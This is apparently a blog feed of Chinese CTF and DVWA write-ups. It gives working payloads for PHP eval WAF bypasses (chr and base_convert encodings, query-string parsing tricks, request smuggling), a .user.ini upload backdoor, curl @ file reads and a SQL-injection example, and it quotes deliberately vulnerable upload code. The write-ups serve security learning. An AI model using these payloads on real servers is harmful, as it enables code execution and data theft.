      <content type="html"><![CDATA[<p>打开题目：</p>
<img src="/2019/10/23/BUUCTF-web-EasyCalc/1.jpg">
<p>随便输入1，回显：</p>
<img src="/2019/10/23/BUUCTF-web-EasyCalc/2.jpg">
<p>再尝试些敏感的关键词，回显：</p>
<img src="/2019/10/23/BUUCTF-web-EasyCalc/3.jpg">
<p>看来是有waf，于是打开源码看看有唔提示：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--I<span class="string">'ve set up WAF to ensure security.--&gt;'</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    $(<span class="string">'#calc'</span>).submit(function()&#123;</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            url:<span class="string">"calc.php?num="</span>+encodeURIComponent($(<span class="string">"#content"</span>).val()),</span><br><span class="line">            type:<span class="string">'GET'</span>,</span><br><span class="line">            success:function(data)&#123;</span><br><span class="line">                $(<span class="string">"#result"</span>).html(`&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"alert alert-success"</span>&gt;</span><br><span class="line">            &lt;strong&gt;答案:&lt;/strong&gt;$&#123;data&#125;</span><br><span class="line">            &lt;/div&gt;`);</span><br><span class="line">            &#125;,</span><br><span class="line">            error:function()&#123;</span><br><span class="line">                alert(<span class="string">"这啥?算不来!"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>源码中提示了这题加了waf，我们访问calc.php，看到源码如下:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $str = $_GET[<span class="string">'num'</span>];</span><br><span class="line">        $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>,<span class="string">'\$'</span>,<span class="string">'\\'</span>,<span class="string">'\^'</span>];</span><br><span class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $str)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">"what are you want to do?"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">'echo '</span>.$str.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>由这个waf我们得知payload中不能含有”‘ ‘, ‘\t’, ‘\r’, ‘\n’,’&#39;‘, ‘“‘, ‘`‘, ‘[‘, ‘]‘,’$‘,’\‘,’^‘“字符，除此之外，经过测试，这还过滤了字母，若num中含有字母则会返回403，所以除了上面这个waf、还有一个black_list</p>
<p>那么第一步要做的就是绕过他们<br>其中一个最简单的办法就是直接在查询参数前面加个空格，即将<strong>?num=</strong>改为<strong>? num=</strong>即可绕过（在num前加个空格）</p>
<h2 id="利用PHP的字符串解析特性绕过modsecurity"><a href="#利用PHP的字符串解析特性绕过modsecurity" class="headerlink" title="利用PHP的字符串解析特性绕过modsecurity"></a>利用PHP的字符串解析特性绕过modsecurity</h2><p>转至：<a href="https://www.freebuf.com/articles/web/213359.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/213359.html</a></p>
<p>PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] =&gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] =&gt; 42)。如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/news.php?%20news[id%00=42<span class="string">"+AND+1=0--</span></span><br></pre></td></tr></table></figure>

<p>上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中</p>
<p>HP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.删除空白符</span><br><span class="line"></span><br><span class="line">2.将某些字符转换为下划线（包括空格）</span><br></pre></td></tr></table></figure>

<p>例如：</p>
<table>
<thead>
<tr>
<th align="left">User input</th>
<th align="center">Decoded PHP</th>
<th align="center">variable name</th>
</tr>
</thead>
<tbody><tr>
<td align="left">%20foo_bar%20</td>
<td align="center">foo_bar</td>
<td align="center">foo_bar</td>
</tr>
<tr>
<td align="left">foo%20bar%00</td>
<td align="center">foo bar</td>
<td align="center">foo_bar</td>
</tr>
<tr>
<td align="left">foo%5bbar</td>
<td align="center">foo[bar</td>
<td align="center">foo_bar</td>
</tr>
</tbody></table>
<p>parser_str函数如何处理字符串：</p>
<img src="/2019/10/23/BUUCTF-web-EasyCalc/4.jpg">

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">foreach</span>(</span><br><span class="line">        [</span><br><span class="line">            <span class="string">"&#123;chr&#125;foo_bar"</span>,</span><br><span class="line">            <span class="string">"foo&#123;chr&#125;bar"</span>,</span><br><span class="line">            <span class="string">"foo_bar&#123;chr&#125;"</span></span><br><span class="line">        ] <span class="keyword">as</span> $k =&gt; $arg) &#123;</span><br><span class="line">            <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;=<span class="number">255</span>;$i++) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"\033[999D\033[K\r"</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"["</span>.$arg.<span class="string">"] check "</span>.bin2hex(chr($i)).<span class="string">""</span>;</span><br><span class="line">                parse_str(str_replace(<span class="string">"&#123;chr&#125;"</span>,chr($i),$arg).<span class="string">"=bla"</span>,$o);</span><br><span class="line">                <span class="comment">/* yes... I've added a sleep time on each loop just for </span></span><br><span class="line"><span class="comment">                the scenic effect :)</span></span><br><span class="line"><span class="comment">  like that movie with unrealistic </span></span><br><span class="line"><span class="comment">                brute-force where the password are obtained </span></span><br><span class="line"><span class="comment">                one byte at a time (∩｀-´)⊃━☆ﾟ.*･｡ﾟ </span></span><br><span class="line"><span class="comment">                */</span></span><br><span class="line">                usleep(<span class="number">5000</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">isset</span>($o[<span class="string">"foo_bar"</span>])) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">"\033[999D\033[K\r"</span>;</span><br><span class="line">                    <span class="keyword">echo</span> $arg.<span class="string">" -&gt; "</span>.bin2hex(chr($i)).<span class="string">" ("</span>.chr($i).<span class="string">")\n"</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"\033[999D\033[K\r"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<img src="/2019/10/23/BUUCTF-web-EasyCalc/5.jpg">
<p>parse_str函数通常被自动应用于get、post请求和cookie中。如果你的Web服务器接受带有特殊字符的参数名，那么也会发生类似的情况。如上代码所示，我进行了多次循环，枚举了参数名三个位置的0到255之间的所有字符，看看解析函数到底是如何处理这些特殊字符的。结果如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.[1st]foo_bar</span><br><span class="line"></span><br><span class="line">2.foo[2nd]bar</span><br><span class="line"></span><br><span class="line">3.foo_bar[3rd]</span><br></pre></td></tr></table></figure>

<img src="/2019/10/23/BUUCTF-web-EasyCalc/6.jpg">
<img src="/2019/10/23/BUUCTF-web-EasyCalc/7.jpg">
<p>在上述方案中，foo%20bar和foo+bar等效，均解析为foo bar。</p>
<h3 id="payload："><a href="#payload：" class="headerlink" title="payload："></a>payload：</h3><h4 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc.php? num=phpinfo()</span><br></pre></td></tr></table></figure>

<p>发现有禁用函数</p>
<img src="/2019/10/23/BUUCTF-web-EasyCalc/8.png">
<p>不管，先找</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? num=var_dump(scandir(dirname(dirname(dirname(getcwd())))));</span><br></pre></td></tr></table></figure>

<h5 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getcwd — 取得当前工作目录</span><br><span class="line">dirname(string <span class="variable">$path</span>) — 返回 path 的父目录</span><br><span class="line">scandir — 列出指定路径中的文件和目录</span><br></pre></td></tr></table></figure>

<p>找到flag：</p>
<img src="/2019/10/23/BUUCTF-web-EasyCalc/9.jpg">

<p>又因为过滤了些符号，不能直接var_dump(file_get_contents(‘/f1agg’))，所以想到了可以用编码绕过</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?%20num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br></pre></td></tr></table></figure>

<h4 id="方法二：利用base-convert"><a href="#方法二：利用base-convert" class="headerlink" title="方法二：利用base_convert"></a>方法二：利用base_convert</h4><p> base_convert函数可以在任意进制之间转换数字，可以返回任意字母，需要注意它无法返回_ *等特殊字符</p>
<img src="/2019/10/23/BUUCTF-web-EasyCalc/10.png">
<p>又发现dechex函数可以把10进制转换为16进制，我们可以再异或出hex2bin——（将十六进制数转换为二进制数），来获取任意ASCII字符</p>
<img src="/2019/10/23/BUUCTF-web-EasyCalc/11.jpg">
<p>可以构造var_dump(base_convert(61693386291,10,36)(hex2bin(dechex(46)).hex2bin(dechex(47))))相当于var_dump(scandir(./))<br>找到f1agg后<br>可以构造出readfile(/f1agg)来读取文件<br>构造为：base_convert(2146934604002,10,36)(hex2bin(dechex(47)).base_convert(25254448,10,36))就可以得到flag文件。</p>
<h2 id="协议层的攻击——HTTP请求走私"><a href="#协议层的攻击——HTTP请求走私" class="headerlink" title="协议层的攻击——HTTP请求走私"></a>协议层的攻击——HTTP请求走私</h2><p>除此之外，还有另一种方法可以绕过：<br>利用HTTP请求走私来绕过，该漏洞可以参考“协议层的攻击——HTTP请求走私”：<a href="https://paper.seebug.org/1048/#31-cl0get" target="_blank" rel="noopener">https://paper.seebug.org/1048/#31-cl0get</a></p>
<p>当我们向代理服务器发送一个比较模糊的HTTP请求时，由于两者服务器的实现方式不同，可能代理服务器认为这是一个HTTP请求，然后将其转发给了后端的源站服务器，但源站服务器经过解析处理后，只认为其中的一部分为正常请求，剩下的那一部分，就算是走私的请求，当该部分对正常用户的请求造成了影响之后，就实现了HTTP走私攻击。</p>
<p>理解为php中$_request 相同字段名优先接收post参数，就是这个同时向服务器传递get和post请求，而waf那里只处理了post请求的值，从而使get请求的值绕过了waf的拦截</p>
<p>使用两个 “Content-Length” 绕过</p>
<img src="/2019/10/23/BUUCTF-web-EasyCalc/12.jpg">

<p>payload同上</p>
<img src="/2019/10/23/BUUCTF-web-EasyCalc/13.jpg">]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[BUUCTF-web-Checkln]]></title>
      <url>/2019/10/20/BUUCTF-web-Checkln/</url>
      <content type="html"><![CDATA[<img src="/2019/10/20/BUUCTF-web-Checkln/1.jpg">
<p>打开题目是一个上传页面<br>随便上传一个php文件，发现报错</p>
<img src="/2019/10/20/BUUCTF-web-Checkln/2.jpg">
<p>于是随意改变文件后缀，仍然报错，但报错内容不一样了，判断这是黑名单过滤后缀</p>
<img src="/2019/10/20/BUUCTF-web-Checkln/3.jpg">
<p>html字符转义：</p>
<img src="/2019/10/20/BUUCTF-web-Checkln/12.jpg">
<p>发现报错信息里提到的是文件内容的<strong>&lt;?</strong>进行了过滤，但也说明了他是用黑名单过滤文件后缀的<br>因为对<strong>&lt;?</strong>进行了过滤，所以要绕过可以将php标记格式改为脚本标记格式：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=php&gt; phpinfo(); &lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>但是上传后发现又报错</p>
<img src="/2019/10/20/BUUCTF-web-Checkln/4.jpg">
<p>不过其中的信息有些敏感<strong>exif_imagetype</strong>，判断可能是用了exif_imagetype()函数对文件格式进行了检查</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exif_imagetype() 读取一个图像的第一个字节并检查其签名</span><br></pre></td></tr></table></figure>

<p>可以在内容的开头直接加上图片的标识头：GIF、JFIF..</p>
<img src="/2019/10/20/BUUCTF-web-Checkln/5.jpg">
<p>成功上传，不过没有办法直接利用<br>于是就想到了.htaccess但是这个方法局限性太大，反正是不成功….（查了之后才知道这是nginx不是apache，难怪…)</p>
<p>后来看大佬的writeup学习了…</p>
<h2 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h2><p>这得从php.ini说起了。php.ini是php默认的配置文件，其中包括了很多php的配置，这些配置中，又分为几种：PHP_INI_SYSTEM、PHP_INI_PERDIR、PHP_INI_ALL、PHP_INI_USER。</p>
<img src="/2019/10/20/BUUCTF-web-Checkln/6.jpg">

<p>其中就提到了，模式为PHP_INI_USER的配置项，可以在ini_set()函数中设置、注册表中设置，再就是.user.ini中设置。 这里就提到了.user.ini，那么这是个什么配置文件？那么官方文档在这里又解释了：</p>
<p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录 ($_SERVER[‘DOCUMENT_ROOT’]所指定的)。如果被执行的 PHP 文件再 web 根目录之外，则之扫描该目录。</p>
<p>在 .user.ini 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。</p>
<p>这里就很清楚了，.user.ini实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。（上面表格中没有提到的PHP_INI_PERDIR也可以在.user.ini中设置）</p>
<p>实际上，除了PHP_INI_SYSTEM以外的模式（包括PHP_INI_ALL）都是可以通过.user.ini来设置的。</p>
<p>而且，和php.ini不同的是，.user.ini是一个能被动态加载的ini文件。也就是说我修改了.user.ini后，不需要重启服务器中间件，只需要等待user_ini.cache_ttl所设置的时间（默认为300秒），即可被重新加载。</p>
<p>然后我们看到php.ini中的配置项，可惜我沮丧地发现，只要稍微敏感的配置项，都是PHP_INI_SYSTEM模式的（甚至是php.ini only的），包括disable_functions、extension_dir、enable_dl等。 不过，我们可以很容易地借助.user.ini文件来构造一个“后门”。</p>
<p>PHP配置项中有两个比较有意思的项（下图第一、四个）：</p>
<img src="/2019/10/20/BUUCTF-web-Checkln/7.jpg">

<p>auto_prepend_file 表示在php程序加载第一个php代码前加载的php文件<br>auto_append_file 是在php代码执行完毕后加载的文件</p>
<p>指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。<br>使用方法很简单，直接写在.user.ini中：</p>
<img src="/2019/10/20/BUUCTF-web-Checkln/8.jpg">

<p>再上传一个1.jpg文件</p>
<img src="/2019/10/20/BUUCTF-web-Checkln/9.jpg">

<p>由于同一目录下还有index.php文件，所以我们可以访问他来执行1.jpg的内容</p>
<img src="/2019/10/20/BUUCTF-web-Checkln/10.jpg">
<p>成功</p>
<p>所以再上传文件’cat /flag’即可</p>
<img src="/2019/10/20/BUUCTF-web-Checkln/11.jpg">]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[CRYPTO-base64-异或]]></title>
      <url>/2019/09/22/CRYPTO-base64-%E5%BC%82%E6%88%96/</url>
      <content type="html"><![CDATA[<p>题目给出的解压包里的文本：</p>
<img src="/2019/09/22/CRYPTO-base64-异或/1.jpg">
<p>第一眼看到就感觉像base64，解码后为</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">igq4;441R;1ikR51ibOO0</span><br></pre></td></tr></table></figure>

<p>看到这种格式只想到igq4可能与flag有某种关系但还是毫无思路…<br>于是去找大佬看看这种格式是什么加密，结果查到的是异或运算，但出题人把前面的flag对应的密文给去掉了<br>完整的密文应该为</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EOBD.7igq4;741R;1ikR51ibOO0</span><br></pre></td></tr></table></figure>

<p>最后利用脚本进行解密….</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment">#miwen=base64.b64decode("RU9CRC43aWdxNDsxaWtiNTFpYk9PMDs6NDFS")</span></span><br><span class="line">miwen=<span class="string">"EOBD.7igq4;741R;1ikR51ibOO0"</span></span><br><span class="line">mingwen=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">    sign=<span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> miwen:</span><br><span class="line">        mingwenint=(ord(j)^i)</span><br><span class="line">        <span class="keyword">if</span> mingwenint&gt;<span class="number">32</span> <span class="keyword">and</span> mingwenint&lt;<span class="number">128</span>:</span><br><span class="line">            mingwen+=chr(mingwenint)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            sign=<span class="literal">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> sign:</span><br><span class="line">        <span class="keyword">print</span> (mingwen)</span><br><span class="line">    mingwen=<span class="string">""</span></span><br></pre></td></tr></table></figure>

<p>得到flag：</p>
<img src="/2019/09/22/CRYPTO-base64-异或/2.jpg">]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[攻防世界-web-cat]]></title>
      <url>/2019/09/18/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web-cat/</url>
      <content type="html"><![CDATA[<p>进入页面看到有个输入框，见提示输入域名baidu.com测试</p>
<img src="/2019/09/18/攻防世界-web-cat/1.jpg">
<p>发现无任何回显，输入127.0.0.1或localhost测试</p>
<img src="/2019/09/18/攻防世界-web-cat/2.jpg">
<p>发现执行成功，执行的是一个ping命令<br>于是就想着可能是命令拼接执行，但是输入任何有关的字符串就会提示invalid url</p>
<img src="/2019/09/18/攻防世界-web-cat/3.jpg">
<p>所以可以想到系统对这些字符串进行了过滤，此外可以看到该题是通过get来传参的<br>于是在<strong>?url=</strong>这里，我们传递个%79后发现，%79被编码为y</p>
<img src="/2019/09/18/攻防世界-web-cat/4.jpg">


<img src="/2019/09/18/攻防世界-web-cat/5.jpg">
<p>看来是可以传递url编码，系统会接受并进行解析，于是我们传递%80会出现报错，url编码使用的是16进制，80也就是128，ASCII码是从0-127，所以这个时候会报错。<br>url编码表可以参考<a href="http://www.w3school.com.cn/tags/html_ref_urlencode.html" target="_blank" rel="noopener">http://www.w3school.com.cn/tags/html_ref_urlencode.html</a><br>出现报错信息，是一段html代码，将这些代码复制到记事本后改为html文件打开</p>
<img src="/2019/09/18/攻防世界-web-cat/6.jpg">
<p>这是django报错的页面，所以是将输入的参数传到了后端的django服务中进行解析，但django设置了编码为gbk导致错误编码了宽字符（超过了ascii码的范围）<br>而此时想到前面的@字符没有被过滤<br>在比赛原题是有个提示的：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RTFM of PHP CURL===&gt;&gt;<span class="built_in">read</span> the fuck manul of PHP CURL???</span><br></pre></td></tr></table></figure>

<p>这是关于php curl的，于是可以找到php curl中关于@的相关知识点</p>

<p>所以我们能够使用@读取文件内容<br>再结合django的报错得知了项目的绝对路径为<strong>/opt/api</strong></p>
<img src="/2019/09/18/攻防世界-web-cat/8.jpg">
<p>这里还需要懂得一些django开发的基本知识，django项目下一般有个settings.py文件是设置网站数据库路径（django默认使用的是sqlites数据库），如果使用的是其它数据库的话settings.py则设置用户和密码。除此之外，settings.py还会对项目整体的设置进行定义。</p>
<p>读取settings.py文件，这里需要注意django项目生成时settings.py会存放在项目目录下再以项目名称命名的文件夹下面。</p>
<img src="/2019/09/18/攻防世界-web-cat/9.jpg">
<img src="/2019/09/18/攻防世界-web-cat/10.jpg">
<p>同样在使用@读取数据库信息</p>
<img src="/2019/09/18/攻防世界-web-cat/11.jpg">
<p>在报错信息中搜索CTF得到flag。</p>
<img src="/2019/09/18/攻防世界-web-cat/12.jpg">]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[DVMA-File-Upload]]></title>
      <url>/2019/09/04/DVMA-File-Upload/</url>
      <content type="html"><![CDATA[<h1 id="Low"><a href="#Low" class="headerlink" title="Low:"></a>Low:</h1><p>源代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Upload'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>;   <span class="comment">//上传文件的路径</span></span><br><span class="line">    $target_path .= basename( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] );   <span class="comment">//文件路径=上文文件的路径+文件名</span></span><br><span class="line">    <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">    <span class="keyword">if</span>( !move_uploaded_file( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ], $target_path ) ) &#123;</span><br><span class="line">        <span class="comment">// No</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Yes!</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="关键函数："><a href="#关键函数：" class="headerlink" title="关键函数："></a>关键函数：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">basename(path,suffix)：函数返回路径中的文件名部分，如果可选参数suffix为空，则返回的文件名包含后缀名，反之不包含后缀名。</span><br></pre></td></tr></table></figure>

<p>可以看到，服务器对上传文件的类型、内容没有做任何的检查、过滤，存在明显的文件上传漏洞，生成上传路径后，服务器会检查是否上传成功并返回相应提示信息。<br>如果上传成功，则会提示  路径+succesfully uploaded! 如果上传失败，则会提示 Your image was not uploaded。<br>我们可以写一句话木马 1.php ，上传</p>
<h1 id="Medium"><a href="#Medium" class="headerlink" title="Medium:"></a>Medium:</h1><p>源代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Upload'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>;</span><br><span class="line">    $target_path .= basename( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] );</span><br><span class="line">    <span class="comment">// File information</span></span><br><span class="line">    $uploaded_name = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ];</span><br><span class="line">    $uploaded_type = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'type'</span> ];</span><br><span class="line">    $uploaded_size = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'size'</span> ];</span><br><span class="line">    <span class="comment">// Is it an image?</span></span><br><span class="line">    <span class="keyword">if</span>( ( $uploaded_type == <span class="string">"image/jpeg"</span> || $uploaded_type == <span class="string">"image/png"</span> ) &amp;&amp;</span><br><span class="line">        ( $uploaded_size &lt; <span class="number">100000</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">        <span class="keyword">if</span>( !move_uploaded_file( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ], $target_path ) ) &#123;</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Invalid file</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到，服务器对上传文件的大小和类型做了限制。只允许上传小于 100000 字节并且文件type类型是image/jpeg或 image/png 的</p>
